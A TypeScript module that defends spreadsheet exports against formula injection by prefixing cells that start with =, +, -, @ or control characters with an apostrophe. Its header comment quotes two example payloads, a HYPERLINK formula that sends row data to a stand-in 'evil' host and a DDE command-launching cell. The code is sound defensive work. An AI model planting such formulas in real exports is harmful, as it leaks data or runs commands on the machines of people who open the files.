/** Spreadsheet sinks for collected or person-chosen text (ADR-435, ADR-567 D10).
 *
 *  A cell that starts with = + - @ TAB CR or LF is evaluated by Excel and
 *  Sheets: `=HYPERLINK("http://evil/?x="&A1,"Click")` exfiltrates the row when
 *  someone opens the file, and `+cmd|'/c calc'!A1` is the DDE variant. React
 *  escapes the page and SQLAlchemy parameterises the query; a spreadsheet does
 *  neither.
 *
 *  Prefixing with an apostrophe is OWASP's recommendation: the cell renders as
 *  typed and is never evaluated. Escape at EXPORT, never at submit: "-Riverside"
 *  is a real building name, and the database has readers that aren't
 *  spreadsheets.
 *
 *  One helper for CSV and XLSX so the two formats can't drift apart on a
 *  security control (moved here from CollectionData.tsx for ADR-567, when
 *  people's own chosen names started reaching exports).
 */
export function deFormula(v: unknown): string {
  const s = String(v ?? '');
  return /^[=+\-@\t\r\n]/.test(s) ? `'${s}` : s;
}

/** One CSV cell: neutralised, always quoted, interior quotes doubled. */
export const csvCell = (v: unknown): string => `"${deFormula(v).replace(/"/g, '""')}"`;

/** An XLSX cell: neutralise strings, leave numbers and empties as they are. */
export const xlsxCell = (v: unknown): unknown => (typeof v === 'string' ? deFormula(v) : v);
